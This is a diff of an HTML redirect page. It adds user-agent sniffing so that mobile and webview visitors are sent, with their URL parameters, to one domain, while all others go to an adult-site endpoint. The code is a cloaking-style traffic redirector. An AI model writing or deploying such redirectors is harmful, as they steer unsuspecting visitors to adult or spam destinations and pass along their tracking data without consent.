@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -6,7 +5,23 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirect Page</title>
     <script>
-        window.location.href = "https://s.pornoshub.site/api/back/0cudgl47nh";
+        // Function to detect webview
+        function isWebView() {
+            return /wv|WebView|FxiOS|CriOS|iOS|Android/i.test(navigator.userAgent);
+        }
+
+        // Get current URL parameters
+        const currentUrl = new URL(window.location.href);
+        const params = currentUrl.search;
+
+        // Redirect logic
+        if (isWebView()) {
+            // Forward webview traffic to the fallback URL with parameters
+            window.location.href = "https://s.tubesplash.net/fallback_url" + params;
+        } else {
+            // Redirect to the desired URL
+            window.location.href = "https://s.pornoshub.site/api/back/0cudgl47nh";
+        }
     </script>
 </head>
 <body>
